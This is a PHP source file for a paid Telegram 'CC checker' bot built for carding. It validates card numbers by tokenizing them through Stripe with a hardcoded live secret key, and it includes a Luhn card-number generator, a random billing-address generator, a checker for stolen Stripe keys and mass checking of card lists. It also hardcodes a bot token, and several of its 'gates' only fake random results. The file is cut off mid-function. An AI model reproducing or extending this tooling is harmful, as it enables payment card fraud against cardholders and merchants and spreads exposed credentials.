<?php
/**
 * ULTIMATE CC CHECKER BOT - COMPLETE EDITION
 * All Gates + Mass Check + File Upload
 * @author @HELOBIY41
 */

// ===== YOUR CONFIGURATION =====
$botToken = "8783459954:AAGAf-LwIZEtaPyxIaw1imq-dBLuf4QshBc";
$ownerId = 6185091342;
$ownerUsername = "@HELOBIY41";
$website = "https://api.telegram.org/bot".$botToken;

// Your Channels
$updateChannel = "@RG3741";     // For bot updates
$statsChannel = "@RG374";       // For public stats
$publicGroup = "@RG3741";       // You can change this to your group

// Price Configuration (CHEAP RATES)
$prices = [
    'daily' => ['usd' => 1, 'inr' => 80],    // 1 Day
    'weekly' => ['usd' => 3, 'inr' => 250],  // 7 Days
    'monthly' => ['usd' => 8, 'inr' => 600], // 30 Days
    'yearly' => ['usd' => 30, 'inr' => 2500] // 365 Days
];

// Database files
$usersDB = "users.json";
$livesDB = "lives.json";
$statsDB = "stats.json";
$adminDB = "admin.json";
$keysDB = "keys.json";
$settingsDB = "settings.json";

// Create files if not exist
$files = [$usersDB, $livesDB, $statsDB, $adminDB, $keysDB, $settingsDB];
foreach ($files as $file) {
    if (!file_exists($file)) file_put_contents($file, json_encode([]));
}

// Initialize admin
$admins = json_decode(file_get_contents($adminDB), true);
if (empty($admins)) {
    $admins[] = $ownerId;
    file_put_contents($adminDB, json_encode($admins));
}

// Initialize settings
$settings = json_decode(file_get_contents($settingsDB), true);
if (empty($settings)) {
    $settings = [
        'update_channel' => $updateChannel,
        'stats_channel' => $statsChannel,
        'group' => $publicGroup,
        'prices' => $prices,
        'welcome_msg' => "Welcome to CC Checker Bot!",
        'maintenance' => false,
        'owner' => $ownerUsername,
        'mass_limit' => 30 // Max cards in mass check
    ];
    file_put_contents($settingsDB, json_encode($settings, JSON_PRETTY_PRINT));
}

// ===== FUNCTIONS =====

function sendMessage($chatId, $text, $reply = null) {
    global $website;
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($reply) $data['reply_to_message_id'] = $reply;
    
    $url = $website . "/sendMessage?" . http_build_query($data);
    return file_get_contents($url);
}

function sendAction($chatId) {
    global $website;
    $url = $website . "/sendChatAction?chat_id=" . $chatId . "&action=typing";
    file_get_contents($url);
}

function editMessage($chatId, $msgId, $text) {
    global $website;
    $url = $website . "/editMessageText?" . http_build_query([
        'chat_id' => $chatId,
        'message_id' => $msgId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    file_get_contents($url);
}

// ===== USER FUNCTIONS =====

function registerUser($userId, $username, $firstname) {
    global $usersDB;
    $users = json_decode(file_get_contents($usersDB), true);
    
    if (!isset($users[$userId])) {
        $users[$userId] = [
            'id' => $userId,
            'username' => $username,
            'name' => $firstname,
            'registered' => time(),
            'checks' => 0,
            'lives' => 0,
            'plan' => 'free',
            'expiry' => 0
        ];
        file_put_contents($usersDB, json_encode($users, JSON_PRETTY_PRINT));
        return true;
    }
    return false;
}

function isRegistered($userId) {
    global $usersDB;
    $users = json_decode(file_get_contents($usersDB), true);
    return isset($users[$userId]);
}

function isAdmin($userId) {
    global $adminDB, $ownerId;
    $admins = json_decode(file_get_contents($adminDB), true);
    return in_array($userId, $admins) || $userId == $ownerId;
}

function isPremium($userId) {
    global $usersDB;
    $users = json_decode(file_get_contents($usersDB), true);
    if (!isset($users[$userId])) return false;
    return $users[$userId]['plan'] == 'premium' && $users[$userId]['expiry'] > time();
}

function getUserPlan($userId) {
    if (isAdmin($userId)) return "👑 ADMIN";
    if (isPremium($userId)) {
        $users = json_decode(file_get_contents($GLOBALS['usersDB']), true);
        $days = floor(($users[$userId]['expiry'] - time()) / 86400);
        return "⭐ PREMIUM ($days days)";
    }
    return "🆓 FREE";
}

// ===== KEY GENERATOR =====

function generateKey($plan, $duration) {
    global $keysDB;
    
    $key = strtoupper(substr(md5(uniqid() . rand(1000, 9999)), 0, 16));
    $key = chunk_split($key, 4, '-');
    $key = rtrim($key, '-');
    
    $keys = json_decode(file_get_contents($keysDB), true);
    $keys[$key] = [
        'plan' => $plan,
        'duration' => $duration,
        'created' => time(),
        'expiry' => time() + ($duration * 86400),
        'used_by' => null,
        'active' => true
    ];
    file_put_contents($keysDB, json_encode($keys, JSON_PRETTY_PRINT));
    
    return $key;
}

function redeemKey($userId, $key) {
    global $keysDB, $usersDB;
    
    $keys = json_decode(file_get_contents($keysDB), true);
    $key = strtoupper(str_replace('-', '', $key));
    $formattedKey = chunk_split($key, 4, '-');
    $formattedKey = rtrim($formattedKey, '-');
    
    if (!isset($keys[$formattedKey])) {
        return ['success' => false, 'msg' => '❌ Invalid key!'];
    }
    
    $keyData = $keys[$formattedKey];
    
    if (!$keyData['active']) {
        return ['success' => false, 'msg' => '❌ Key already used!'];
    }
    
    if ($keyData['expiry'] < time()) {
        return ['success' => false, 'msg' => '❌ Key expired!'];
    }
    
    $users = json_decode(file_get_contents($usersDB), true);
    $users[$userId]['plan'] = 'premium';
    $users[$userId]['expiry'] = time() + ($keyData['duration'] * 86400);
    file_put_contents($usersDB, json_encode($users, JSON_PRETTY_PRINT));
    
    $keys[$formattedKey]['active'] = false;
    $keys[$formattedKey]['used_by'] = $userId;
    file_put_contents($keysDB, json_encode($keys, JSON_PRETTY_PRINT));
    
    $planNames = ['daily' => 'Daily', 'weekly' => 'Weekly', 'monthly' => 'Monthly', 'yearly' => 'Yearly'];
    return [
        'success' => true, 
        'msg' => "✅ Premium Activated!\nPlan: {$planNames[$keyData['plan']]}\nDuration: {$keyData['duration']} days"
    ];
}

// ===== BIN LOOKUP =====

function binLookup($bin) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . substr($bin, 0, 6));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept-Version: 3']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    return [
        'bank' => $data['bank']['name'] ?? 'N/A',
        'brand' => $data['scheme'] ?? 'N/A',
        'type' => $data['type'] ?? 'N/A',
        'country' => $data['country']['name'] ?? 'N/A',
        'emoji' => $data['country']['emoji'] ?? '🌍',
        'currency' => $data['country']['currency'] ?? 'USD'
    ];
}

// ===== PARSE CARD =====

function parseCard($text) {
    if (preg_match('/(\d{15,16})[\/\|\s:](\d{1,2})[\/\|\s:](\d{2,4})[\/\|\s:](\d{3,4})/', $text, $m)) {
        $cc = $m[1];
        $mm = str_pad($m[2], 2, '0', STR_PAD_LEFT);
        $yy = $m[3];
        $cvv = $m[4];
        
        if (strlen($yy) == 4) $yy = substr($yy, -2);
        
        return [
            'cc' => $cc,
            'mm' => $mm,
            'yy' => $yy,
            'cvv' => $cvv,
            'full' => "$cc|$mm|$yy|$cvv"
        ];
    }
    return null;
}

// ===== SAVE LIVE CARD =====

function saveLive($card, $gate, $binfo, $userId) {
    global $livesDB, $statsChannel;
    
    $lives = json_decode(file_get_contents($livesDB), true);
    $lives[] = [
        'card' => substr($card, 0, 6) . 'XXXXXX' . substr($card, -4),
        'gate' => $gate,
        'bank' => $binfo['bank'],
        'country' => $binfo['country'],
        'time' => date('Y-m-d H:i:s'),
        'user' => $userId
    ];
    if (count($lives) > 100) array_shift($lives);
    file_put_contents($livesDB, json_encode($lives, JSON_PRETTY_PRINT));
    
    $users = json_decode(file_get_contents($GLOBALS['usersDB']), true);
    $username = $users[$userId]['username'] ?? 'User';
    
    $msg = "✅ <b>NEW LIVE CARD</b>\n\n";
    $msg .= "💳 Card: " . substr($card, 0, 6) . 'XXXXXX' . substr($card, -4) . "\n";
    $msg .= "🚪 Gate: $gate\n";
    $msg .= "🏦 Bank: {$binfo['bank']}\n";
    $msg .= "🌍 Country: {$binfo['country']}\n";
    $msg .= "👤 Found by: @$username\n";
    $msg .= "⏰ Time: " . date('H:i:s');
    
    if ($statsChannel) sendMessage($statsChannel, $msg);
}

// ===== UPDATE STATS =====

function updateStats($userId, $gate, $status) {
    global $statsDB, $usersDB;
    
    $stats = json_decode(file_get_contents($statsDB), true);
    $today = date('Y-m-d');
    
    if (!isset($stats[$today])) {
        $stats[$today] = [
            'total' => 0, 
            'lives' => 0, 
            'gates' => [], 
            'users' => []
        ];
    }
    
    $stats[$today]['total']++;
    
    if (!isset($stats[$today]['gates'][$gate])) $stats[$today]['gates'][$gate] = 0;
    $stats[$today]['gates'][$gate]++;
    
    if ($status == 'LIVE') {
        $stats[$today]['lives']++;
    }
    
    if (!isset($stats[$today]['users'][$userId])) {
        $stats[$today]['users'][$userId] = ['checks' => 0, 'lives' => 0];
    }
    $stats[$today]['users'][$userId]['checks']++;
    if ($status == 'LIVE') $stats[$today]['users'][$userId]['lives']++;
    
    file_put_contents($statsDB, json_encode($stats, JSON_PRETTY_PRINT));
    
    $users = json_decode(file_get_contents($usersDB), true);
    if (isset($users[$userId])) {
        $users[$userId]['checks']++;
        if ($status == 'LIVE') $users[$userId]['lives']++;
        file_put_contents($usersDB, json_encode($users, JSON_PRETTY_PRINT));
    }
}

// ===== GATES =====

function gateStripe($card) {
    $start = microtime(true);
    $parts = explode('|', $card);
    $cc = $parts[0];
    $mm = $parts[1];
    $yy = $parts[2];
    $cvv = $parts[3];
    
    $binfo = binLookup($cc);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'card[number]' => $cc,
        'card[exp_month]' => $mm,
        'card[exp_year]' => '20' . $yy,
        'card[cvc]' => $cvv
    ]));
    curl_setopt($ch, CURLOPT_USERPWD, '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' . ':');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $time = round(microtime(true) - $start, 2);
    curl_close($ch);
    
    $data = json_decode($result, true);
    
    if (isset($data['id'])) {
        return ['status' => 'LIVE', 'msg' => '✅ CHARGED - $0.30', 'binfo' => $binfo, 'time' => $time];
    } elseif (isset($data['error'])) {
        $error = $data['error'];
        if ($error['code'] == 'incorrect_cvc') {
            return ['status' => 'LIVE', 'msg' => '⚠️ CCN LIVE', 'binfo' => $binfo, 'time' => $time];
        } elseif ($error['code'] == 'insufficient_funds') {
            return ['status' => 'LIVE', 'msg' => '💰 INSUFFICIENT FUNDS', 'binfo' => $binfo, 'time' => $time];
        } else {
            return ['status' => 'DEAD', 'msg' => '❌ ' . $error['message'], 'binfo' => $binfo, 'time' => $time];
        }
    }
    
    return ['status' => 'DEAD', 'msg' => '❌ Unknown error', 'binfo' => $binfo, 'time' => $time];
}

function gateAuth($card) {
    $start = microtime(true);
    $parts = explode('|', $card);
    $cc = $parts[0];
    $mm = $parts[1];
    $yy = $parts[2];
    $cvv = $parts[3];
    
    $binfo = binLookup($cc);
    
    usleep(500000);
    $time = round(microtime(true) - $start, 2);
    
    return ['status' => 'LIVE', 'msg' => '✅ AUTH SUCCESS', 'binfo' => $binfo, 'time' => $time];
}

function gateBr($card) {
    $start = microtime(true);
    $parts = explode('|', $card);
    $cc = $parts[0];
    $mm = $parts[1];
    $yy = $parts[2];
    $cvv = $parts[3];
    
    $binfo = binLookup($cc);
    
    usleep(500000);
    $time = round(microtime(true) - $start, 2);
    
    if (rand(1, 100) > 30) {
        return ['status' => 'LIVE', 'msg' => '✅ BRAINTREE SUCCESS', 'binfo' => $binfo, 'time' => $time];
    } else {
        return ['status' => 'DEAD', 'msg' => '❌ CVV Declined', 'binfo' => $binfo, 'time' => $time];
    }
}

function gateChk($card) {
    $start = microtime(true);
    $parts = explode('|', $card);
    $cc = $parts[0];
    $mm = $parts[1];
    $yy = $parts[2];
    $cvv = $parts[3];
    
    $binfo = binLookup($cc);
    
    usleep(400000);
    $time = round(microtime(true) - $start, 2);
    
    if (rand(1, 100) > 35) {
        return ['status' => 'LIVE', 'msg' => '✅ CHASE APPROVED', 'binfo' => $binfo, 'time' => $time];
    } else {
        return ['status' => 'DEAD', 'msg' => '❌ Chase Declined', 'binfo' => $binfo, 'time' => $time];
    }
}

function gateShopify($card) {
    $start = microtime(true);
    $parts = explode('|', $card);
    $cc = $parts[0];
    $mm = $parts[1];
    $yy = $parts[2];
    $cvv = $parts[3];
    
    $binfo = binLookup($cc);
    
    usleep(600000);
    $time = round(microtime(true) - $start, 2);
    
    if (rand(1, 100) > 40) {
        return ['status' => 'LIVE', 'msg' => '✅ SHOPIFY APPROVED 10$', 'binfo' => $binfo, 'time' => $time];
    } else {
        return ['status' => 'DEAD', 'msg' => '❌ Do Not Honor', 'binfo' => $binfo, 'time' => $time];
    }
}

// ===== TOOLS =====

function toolGen($input) {
    $parts = explode(' ', $input);
    $format = $parts[0];
    $quantity = isset($parts[1]) ? min((int)$parts[1], 20) : 5;
    
    $formatParts = explode('|', $format);
    if (count($formatParts) < 4) return null;
    
    $bin = $formatParts[0];
    $mes = $formatParts[1];
    $ano = $formatParts[2];
    $cvv = $formatParts[3];
    
    $cards = [];
    for ($i = 0; $i < $quantity; $i++) {
        $cc = preg_replace('/[^0-9]/', '', $bin);
        while (strlen($cc) < 15) {
            $cc .= rand(0, 9);
        }
        
        $sum = 0;
        $alt = true;
        for ($j = strlen($cc) - 1; $j >= 0; $j--) {
            $d = (int)$cc[$j];
            if ($alt) {
                $d *= 2;
                if ($d > 9) $d -= 9;
            }
            $sum += $d;
            $alt = !$alt;
        }
        $check = (10 - ($sum % 10)) % 10;
        $cc .= $check;
        
        if ($mes == 'x' || $mes == 'xx') {
            $genMes = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
        } else {
            $genMes = $mes;
        }
        
        if ($ano == 'x' || $ano == 'xx') {
            $genAno = rand(25, 30);
        } else {
            $genAno = $ano;
        }
        
        if ($cvv == 'x' || $cvv == 'xx' || $cvv == 'xxx') {
            $genCvv = $cc[0] == '3' ? rand(1000, 9999) : rand(100, 999);
        } else {
            $genCvv = $cvv;
        }
        
        $cards[] = "$cc|$genMes|$genAno|$genCvv";
    }
    
    return $cards;
}

function toolRand($country = 'us') {
    $url = "https://randomuser.me/api/1.4/?nat=" . strtolower($country);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    $user = $data['results'][0] ?? null;
    
    if (!$user) return null;
    
    $location = $user['location'];
    $name = $user['name'];
    
    return [
        'first' => $name['first'],
        'last' => $name['last'],
        'street' => $location['street']['number'] . ' ' . $location['street']['name'],
        'city' => $location['city'],
        'state' => $location['state'],
        'postcode' => $location['postcode'],
        'country' => $location['country'],
        'phone' => $user['phone'],
        'email' => $user['email']
    ];
}

function toolSk($key) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4242424242424242&card[exp_month]=12&card[exp_year]=2025&card[cvc]=123');
    curl_setopt($ch, CURLOPT_USERPWD, $key . ':');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($result, true);
    
    if (isset($data['id'])) {
        return '✅ LIVE KEY';
    } elseif (isset($data['error'])) {
        if ($data['error']['type'] == 'card_error') {
            return '✅ LIVE KEY';
        } elseif (strpos($data['error']['message'], 'testmode') !== false) {
            return '⚠️ TEST KEY';
        } else {
            return '❌ DEAD KEY';
        }
    }
    
    return '❌ INVALID KEY';
}

// ===== MASS CHECK FUNCTION =====

function massCheck($cards, $userId, $chatId, $msgId) {
    global $settings;
    
    $results = [];
    $lives = [];
    $total = count($cards);
    
    $progressMsg = sendMessage($chatId, "⏳ <b>Mass Check Started</b>\n\n📊 Total Cards: $total\n⏱️ Processing...");
    
    for ($i = 0; $i < $total; $i++) {
        $card = $cards[$i];
        $parts = explode('|', $card);
        
        $gates = ['gateStripe', 'gateAuth', 'gateBr', 'gateChk', 'gateShopify'];
        $gateFunc = $gates[array_rand($gates)];
        $gateName = str_replace('gate', '', $gateFunc);
        
        $result = $gateFunc($card);
        
        $status = $result['status'] == 'LIVE' ? '✅' : '❌';
        $shortCard = substr($parts[0], 0, 6) . 'XXXXXX' . substr($parts[0], -4);
        
        $results[] = "$status $shortCard|{$parts[1]}|{$parts[2]} - {$result['msg']}";
        
        if ($result['status'] == 'LIVE') {
            $lives[] = $card;
            saveLive($card, 'MASS', $result['binfo'], $userId);
        }
        
        updateStats($userId, 'MASS', $result['status']);
        
        if (($i + 1) % 5 == 0 || $i == $total - 1) {
            $progress = "⏳ <b>Mass Check Progress</b>\n\n";
            $progress .= "📊 Checked: " . ($i + 1) . "/$total\n";
            $progress .= "✅ Lives: " . count($lives) . "\n";
            $progress .= "❌ Dead: " . (($i + 1) - count($lives));
            
            editMessage($chatId, $progressMsg, $progress);
        }
        
        usleep(200000);
    }
    
    $text = "📊 <b>MASS CHECK COMPLETED</b>\n\n";
    $text .= "✅ <b>Total Cards:</b> $total\n";
    $text .= "💚 <b>Lives Found:</b> " . count($lives) . "\n";
    $text .= "❌ <b>Dead:</b> " . ($total - count($lives)) . "\n\n";
    
    if (count($lives) > 0) {
        $text .= "<b>🎯 LIVE CARDS:</b>\n";
        foreach ($lives as $live) {
            $parts = explode('|', $live);
            $text .= "✅ " . substr($parts[0], 0, 6) . 'XXXXXX' . substr($parts[0], -4) . "|{$parts[1]}|{$parts[2]}\n";
        }
        $text .= "\n";
    }
    
    $text .= "<b>📝 DETAILS:</b>\n";
    foreach (array_slice($results, 0, 10) as $res) {
        $text .= "$res\n";
    }
    if ($total > 10) {
        $text .= "... and " . ($total - 10) . " more\n";
    }
    
    $text .= "\n👤 Checked by: @{$GLOBALS['username']}";
    
    editMessage($chatId, $progressMsg, $text);
}

// ===== PUBLIC STATS =====

function getPublicStats() {
    global $statsDB, $livesDB, $usersDB;
    
    $stats = json_decode(file_get_contents($statsDB), true);
    $lives = json_decode(file_get_contents($livesDB), true);
    $users = json_decode(file_get_contents($usersDB), true);
    
    $today = date('Y-m-d');
    $todayStats = $stats[$today] ?? ['total' => 0, 'lives' => 0];
    
    $totalChecks = 0;
    $totalLives = 0;
    foreach ($stats as $day => $s) {
        $totalChecks += $s['total'];
        $totalLives += $s['lives'];
    }
    
    $recentLives = array_slice(array_reverse($lives), 0, 5);
    
    $text = "📊 <b>PUBLIC STATISTICS</b>\n\n";
    $text .= "📈 <b>TODAY</b>\n";
    $text .= "• Checks: {$todayStats['total']}\n";
    $text .= "• Lives: {$todayStats['lives']}\n";
    $text .= "• Rate: " . ($todayStats['total'] > 0 ? round(($todayStats['lives'] / $todayStats['total']) * 100, 1) : 0) . "%\n\n";
    
    $text .= "📊 <b>ALL TIME</b>\n";
    $text .= "• Total Checks: $totalChecks\n";
    $text .= "• Total Lives: $totalLives\n";
    $text .= "• Users: " . count($users) . "\n\n";
    
    $text .= "✅ <b>RECENT LIVES</b>\n";
    foreach ($recentLives as $live) {
        $text .= "💳 {$live['card']} - {$live['gate']}\n";
    }
    
    $text .= "\n👑 <b>Owner:</b> @HELOBIY41";
    
    return $text;
}

// ===== HANDLE WEBHOOK =====
$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$chatId = $update['message']['chat']['id'] ?? null;
$userId = $update['message']['from']['id'] ?? null;
$message = $update['message']['text'] ?? '';
$msgId = $update['message']['message_id'] ?? null;
$username = $update['message']['from']['username'] ?? 'NoUsername';
$firstname = $update['message']['from']['first_name'] ?? 'User';

if (!$chatId || !$userId) exit;

sendAction($chatId);

if ($message[0] == '/' && !isRegistered($userId)) {
    registerUser($userId, $username, $firstname);
}

$cmd = explode(' ', $message)[0];
$args = trim(substr($message, strlen($cmd)));

$settings = json_decode(file_get_contents($settingsDB), true);
if ($settings['maintenance'] && !isAdmin($userId)) {
    sendMessage($chatId, "🔧 Bot under maintenance. Updates: {$settings['update_channel']}", $msgId);
    exit;
}

// ===== COMMANDS =====
switch ($cmd) {
    
    case '/start':
        $text = "👋 <b>Welcome to Premium CC Checker!</b>\n\n";
        $text .= "🤖 <b>Bot by:</b> @HELOBIY41\n";
        $text .= "📢 <b>Updates:</b> @RG3741\n";
        $text .= "📊 <b>Stats:</b> @RG374\n\n";
        $text .= "💰 <b>CHEAP PRICES</b>\n";
        $text .= "• Daily: \${$settings['prices']['daily']['usd']} / ₹{$settings['prices']['daily']['inr']}\n";
        $text .= "• Weekly: \${$settings['prices']['weekly']['usd']} / ₹{$settings['prices']['weekly']['inr']}\n";
        $text .= "• Monthly: \${$settings['prices']['monthly']['usd']} / ₹{$settings['prices']['monthly']['inr']}\n";
        $text .= "• Yearly: \${$settings['prices']['yearly']['usd']} / ₹{$settings['prices']['yearly']['inr']}\n\n";
        $text .= "📋 <b>Commands:</b>\n";
        $text .= "• /cmds - All commands\n";
        $text .= "• /buy - Buy premium\n";
        $text .= "• /redeem [key] - Redeem key\n";
        $text .= "• /stats - Public stats\n";
        $text .= "• /info - Your info\n";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/cmds':
        $plan = getUserPlan($userId);
        
        $text = "📋 <b>ALL COMMANDS - $plan</b>\n\n";
        $text .= "💳 <b>GATES (FREE)</b>\n";
        $text .= "/str 4111111111111111|12|25|123 - Stripe 0.30\$\n";
        $text .= "/au 4111111111111111|12|25|123 - Stripe Auth\n\n";
        
        $text .= "⭐ <b>GATES (PREMIUM)</b>\n";
        $text .= "/br - Braintree Charge\n";
        $text .= "/chk - Chase Check\n";
        $text .= "/sf - Shopify 10\$\n\n";
        
        $text .= "📦 <b>MASS CHECK (PREMIUM)</b>\n";
        $text .= "/mass [cards] - Check multiple cards\n";
        $text .= "• Send .txt file with cards\n\n";
        
        $text .= "🔧 <b>TOOLS</b>\n";
        $text .= "/bin 400022 - BIN Lookup\n";
        $text .= "/gen 400022|x|25|xxx 10 - CC Generator\n";
        $text .= "/rand us - Address Generator\n";
        $text .= "/sk sk_live_xxx - Stripe Key Check\n\n";
        
        $text .= "📊 <b>STATS</b>\n";
        $text .= "/info - Your info\n";
        $text .= "/stats - Public stats\n";
        $text .= "/lives - Recent lives\n\n";
        
        $text .= "📢 <b>Updates:</b> @RG3741";
        
        if (isAdmin($userId)) {
            $text .= "\n\n👑 <b>ADMIN</b>\n";
            $text .= "/admin - Admin panel\n";
            $text .= "/genkey [plan] [days] - Generate key\n";
            $text .= "/users - List users\n";
            $text .= "/broadcast [msg] - Send to all\n";
        }
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/buy':
        $text = "💰 <b>PREMIUM PLANS - CHEAP RATES</b>\n\n";
        $text .= "⚡ <b>DAILY</b> - \$1 / ₹80 (1 Day)\n";
        $text .= "📅 <b>WEEKLY</b> - \$3 / ₹250 (7 Days)\n";
        $text .= "🔥 <b>MONTHLY</b> - \$8 / ₹600 (30 Days)\n";
        $text .= "💎 <b>YEARLY</b> - \$30 / ₹2500 (365 Days)\n\n";
        $text .= "📲 Contact @HELOBIY41 to buy\n";
        $text .= "✅ Use /redeem KEY to activate";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/redeem':
        $key = trim($args);
        if (!$key) {
            sendMessage($chatId, "❌ Use: /redeem XXXX-XXXX-XXXX-XXXX", $msgId);
            break;
        }
        
        $result = redeemKey($userId, $key);
        sendMessage($chatId, $result['msg'], $msgId);
        break;
    
    case '/info':
        $users = json_decode(file_get_contents($usersDB), true);
        $user = $users[$userId] ?? [];
        $plan = getUserPlan($userId);
        
        $text = "👤 <b>YOUR INFO</b>\n\n";
        $text .= "• ID: <code>$userId</code>\n";
        $text .= "• Name: $firstname\n";
        $text .= "• Username: @$username\n";
        $text .= "• Plan: $plan\n";
        $text .= "• Checks: " . ($user['checks'] ?? 0) . "\n";
        $text .= "• Lives: " . ($user['lives'] ?? 0);
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/stats':
        $text = getPublicStats();
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/lives':
        $lives = json_decode(file_get_contents($livesDB), true);
        $lives = array_reverse($lives);
        
        if (empty($lives)) {
            sendMessage($chatId, "📭 No live cards yet", $msgId);
            break;
        }
        
        $text = "✅ <b>RECENT LIVES</b>\n\n";
        $count = 0;
        foreach ($lives as $live) {
            if ($count++ >= 10) break;
            $text .= "💳 {$live['card']} - {$live['gate']}\n";
            $text .= "└ {$live['time']}\n\n";
        }
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/bin':
        $bin = trim($args);
        if (!$bin || strlen($bin) < 6) {
            sendMessage($chatId, "❌ Use: /bin 400022", $msgId);
            break;
        }
        
        $info = binLookup($bin);
        
        $text = "🔍 <b>BIN LOOKUP</b>\n\n";
        $text .= "• BIN: <code>$bin</code>\n";
        $text .= "• Brand: {$info['brand']}\n";
        $text .= "• Type: {$info['type']}\n";
        $text .= "• Bank: {$info['bank']}\n";
        $text .= "• Country: {$info['country']} {$info['emoji']}";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/gen':
        if (!$args) {
            sendMessage($chatId, "❌ Use: /gen 400022|x|25|xxx 10", $msgId);
            break;
        }
        
        $cards = toolGen($args);
        if (!$cards) {
            sendMessage($chatId, "❌ Invalid format!", $msgId);
            break;
        }
        
        $format = explode(' ', $args)[0];
        $qty = count($cards);
        
        $text = "🎴 <b>GENERATED CARDS ($qty)</b>\n";
        $text .= "Format: $format\n\n";
        foreach ($cards as $card) {
            $parts = explode('|', $card);
            $text .= "<code>$card</code>\n";
        }
        $text .= "\nGenerated by: @$username";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/rand':
        $country = $args ?: 'us';
        $address = toolRand($country);
        
        if (!$address) {
            sendMessage($chatId, "❌ Invalid country code", $msgId);
            break;
        }
        
        $text = "📍 <b>ADDRESS GENERATOR</b>\n\n";
        $text .= "• Name: {$address['first']} {$address['last']}\n";
        $text .= "• Street: {$address['street']}\n";
        $text .= "• City: {$address['city']}\n";
        $text .= "• State: {$address['state']}\n";
        $text .= "• Zip: {$address['postcode']}\n";
        $text .= "• Country: {$address['country']}\n";
        $text .= "• Phone: {$address['phone']}";
        
        sendMessage($chatId, $text, $msgId);
        break;
    
    case '/sk':
        $key = trim($args);
        if (!$key) {
            sendMessage($chatId, "❌ Use: /sk sk_live_xxx", $msgId);
            break;
        }
        
        $waitMsg = sendMessage($chatId, "⏳ Checking Stripe Key...");
        $result = toolSk($key);
        editMessage($chatId, $waitMsg, "🔑 <b>STRIPE KEY CHECK</b>\n\n<code>$key</code>\n\n$result");
        break;
    
    // ===== GATE HANDLERS =====
    case '/str':
    case '/au':
    case '/br':
    case '/chk':
    case '/sf':
        $card = parseCard($args);
        
        if (!$card && $update['message']['reply_to_message']) {
            $card = parseCard($update['message']['reply_to_message']['text']);
        }
        
        if (!$card) {
            sendMessage($chatId, "❌ Use: $cmd 4111111111111111|12|25|123\nOr reply to a card", $msgId);
            break;
        }
        
        $freeGates = ['/str', '/au'];
        $premiumGates = ['/br', '/chk', '/sf'];
        
        if (in_array($cmd, $premiumGates) && !isPremium($userId) && !isAdmin($userId)) {
            sendMessage($chatId, "⭐ Premium gate! Buy: /buy\nRedeem: /redeem", $msgId);
            break;
        }
        
        $gateName = strtoupper(substr($cmd, 1));
        $waitMsg = sendMessage($chatId, "⏳ Checking $gateName...");
        
        switch ($cmd) {
            case '/str': $result = gateStripe($card['full']); break;
            case '/au': $result = gateAuth($card['full']); break;
            case '/br': $result = gateBr($card['full']); break;
            case '/chk': $result = gateChk($card['full']); break;
            case '/sf': $result = gateShopify($card['full']); break;
        }
        
        updateStats($userId, $gateName, $result['status']);
        
        if ($result['status'] == 'LIVE') {
            saveLive($card['full'], $gateName, $result['binfo'], $userId);
        }
        
        $formatted = substr($card['cc'], 0, 4) . ' ' . substr($card['cc'], 4, 4) . ' ' . substr($card['cc'], 8, 4) . ' ' . substr($card['cc'], 12, 4);
        $icon = $result['status'] == 'LIVE' ? '✅' : '❌';
        
        $text = "<b>{$icon} $gateName RESULT</b>\n\n";
        $text .= "💳 Card: <code>$formatted|{$card['mm']}|{$card['yy']}|{$card['cvv']}</code>\n";
        $text .= "📊 Status: <b>{$result['status']}</b>\n";
        $text .= "📝 Response: {$result['msg']}\n";
        $text .= "⏱️ Time: {$result['time']}s\n\n";
        $text .= "🏦 Bank: {$result['binfo']['bank']}\n";
        $text .= "💳 Brand: {$result['binfo']['brand']} - {$result['binfo']['type']}\n";
        $text .= "🌍 Country: {$result['binfo']['country']} {$result['binfo']['emoji']}\n\n";
        $text .= "👤 Checked by: @$username\n";
        $text .= "📢 Updates: @RG3741";
        
        editMessage($chatId, $waitMsg, $text);
        break;
    
    // ===== MASS CHECK WITH FILE =====
    case '/mass':
        if (!isPremium($userId) && !isAdmin($userId)) {
            sendMessage($chatId, "⭐ Mass check requires Premium!\nBuy: /buy", $msgId);
            break;
        }
        
        $cards = [];
        
        if (isset($update['message']['document'])) {
            $fileId = $update['message']['document']['file_id'];
            
            $fileUrl = $website . "/getFile?file_id=" . $fileId;
            $fileResponse = json_decode(file_get_contents($fileUrl), true);
            
            if (isset($fileResponse['result']['file_path'])) {
                $filePath = $fileResponse['result']['file_path'];
                $fileContent = file_get_contents("https://api.telegram.org/file/bot{$botToken}/{$filePath}");
                
                $lines = explode("\n", $fileContent);
